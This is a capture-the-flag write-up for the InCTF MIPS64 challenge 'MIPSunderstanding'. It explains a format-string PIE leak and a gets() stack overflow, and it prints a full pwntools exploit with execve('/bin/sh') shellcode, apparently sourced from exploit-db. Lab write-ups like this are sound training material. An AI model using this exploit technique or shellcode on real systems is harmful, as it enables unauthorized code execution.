![](https://i.imgur.com/qUtdCzM.png "MIPSunderstanding")

- - -

> # Checksec

- - -

```yaml
    Arch:     mips-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

> # Overview

- - -

Challenge files : [](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/MIPSunderstanding)[MIPSunderstanding](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/MIPSunderstanding)

```yaml
chall: ELF 64-bit LSB pie executable, MIPS, MIPS-III version 1 (SYSV), dynamically linked, with debug_info, not stripped
```

![enter image description here](https://imgur.com/21z6F5S.png)
I dont know mips assembly and i solved it without understanding mips :)) . It's an easy challenge. Lets open the binary in ghidra and analyse the binary. Well there's alot of junk code in it so ill straight up show you the `thiago` and `keita` function.

### keita

![](https://imgur.com/uhEsnyT.png)

### thiago

![](https://imgur.com/jcPHCE5.png)

So there are two bugs here.

1. Format string bug for Information disclosure bug. We control the first parameter passed to printf and we can use this bug to leak the address where the binary is being loaded and bypass ASLR. 
2. A stack buffer overflow bug because of using the gets function to read input.

Now lets dive into exploitation. But the most important part is to setup an debug environment for mips.

> # Setting up the debug environment

- - -

I always use this template given by [X3eRo0](https://twitter.com/X3eRo0) to debug different arch pwn challenges

```python
#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

from rootkit import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')
context.arch = 'mips'
context.bits = 64
context.endian = 'little'
context.terminal = ["tilix","-a","session-add-right","-e"]
context.delete_corefiles = True
context.rename_corefiles = False

gdbscript = '''
target remote 0.0.0.0:1324
'''
exploit=b""
if args.GDB:
    io = process(["./qemu-mips64el", "-g", "1324", exe.path])
    if os.fork() == 0:
        a = open("/tmp/gdb.gdb", "w")
        a.write(gdbscript)
        a.close()
        cmd = " ".join(context.terminal) + " gdb-multiarch %s -x /tmp/gdb.gdb" % exe.path
        os.system(cmd)
        os.kill(os.getpid(), 9)

else:
    io=remote("gc1.eng.run", "32113")
io.interactive()
```

so with this `expl.py` you can debug the pwn challenge easily.

![debug-setup](https://imgur.com/arvqUwR.png)
Also one more thing to mention here

```yaml
# pwndbg checksec command outside qemu  
    Arch:     mips-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

```yaml
# gef checksec command inside qemu
gef➤  checksec
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

**NX is actually *disabled* inside qemu**. To enable NX the have to patch the qemu binary. Also use gdb-gef instead of pwndbg because pwndbg has alot of issues when it comes to weird architectures.

Lets start to build exploit.

> # Exploit

- - -

1. Use the `keita` function to leak pie address
2. Use the `thiago` function to overflow the stack and return to your shellcode

```python
#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall', checksec=False)
context.arch = 'mips'
context.bits = 64
context.endian = 'little'
context.terminal = ["tilix","-a","session-add-right","-e"]
context.delete_corefiles = True
context.rename_corefiles = False

gdbscript = '''
target remote 0.0.0.0:1324
'''
exploit="A"*512
if args.GDB:
    io = process(["./qemu-mips64el", "-g", "1324", exe.path])
    if os.fork() == 0:
        a = open("/tmp/gdb.gdb", "w")
        a.write(gdbscript)
        a.close()
        cmd = " ".join(context.terminal) + " gdb-multiarch %s -x /tmp/gdb.gdb" % exe.path
        os.system(cmd)
        os.kill(os.getpid(), 9)

else:
    io = process(["./qemu-mips64el", exe.path])

reu(b"+---------------------------------------+\n")
reu(b"+---------------------------------------+\n")
sl(b"A")
sleep(5)
reu(b"Enter the price you are willing to offer !!\n")
sl(b"%1$p")
sleep(5)
main=int(GetInt()[0])-0x18240b4
exe.address = main-exe.sym.main
shellcode_addr=exe.address+0x1827d80+0x30
info(f"Pie base : {hex(exe.address)}")
info(f"Shellcode: {hex(shellcode_addr)}")
info(f"Shellcode: {hex(shellcode_addr)}")
sl(b"1")
re()
sl(b"C")
padding=b"A"*32
rop = flat([
    padding,
    0xdeadbeef,
    exe.address+0x1827d80,
])
sleep(5)
re()
shellcode =  b""
shellcode += b"\x62\x69\x0c\x3c"
shellcode += b"\x2f\x2f\x8c\x35"
shellcode += b"\xf4\xff\xac\xaf"
shellcode += b"\x73\x68\x0d\x3c"
shellcode += b"\x6e\x2f\xad\x35"
shellcode += b"\xf8\xff\xad\xaf"
shellcode += b"\xfc\xff\xa0\xaf"
shellcode += b"\xf4\xff\xa4\x67"
shellcode += b"\xff\xff\x05\x28"
shellcode += b"\xff\xff\x06\x28"
shellcode += b"\xc1\x13\x02\x24"
shellcode += b"\x0c\x01\x01\x01"

# https://www.exploit-db.com/exploits/45287

sl(rop + b"\x00\x00\x00\x00"*32 + shellcode) # \x00\x00\x00\x00 is nops in mips64
reu(b"+---------------------------------------+\n")
sleep(5)
io.interactive()
```

[![asciicast](https://asciinema.org/a/461708.svg)](https://asciinema.org/a/461708)

> InCTF{w3_sh4ll_not_b3_m0v3D_132244345}